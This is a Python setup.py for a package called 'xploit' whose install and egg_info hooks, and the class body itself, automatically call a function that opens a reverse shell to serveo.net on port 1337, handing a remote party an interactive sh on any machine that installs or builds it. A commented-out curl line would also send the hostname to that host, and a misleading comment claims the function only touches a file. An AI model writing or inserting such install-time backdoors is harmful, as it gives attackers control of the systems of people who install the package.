import os
import subprocess
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


def RunCommand():
    # Touch a file in the current directory
    # hostname= os.uname()[1]
    # subprocess.Popen(["curl", "-q","httsp://serveo.net:1337/"+str(hostname)])
    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("serveo.net",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
    print(1)

class RunInstallCommand(install):
    RunCommand()
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "xploit",
    version = "0.0.4",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand,
    },
)
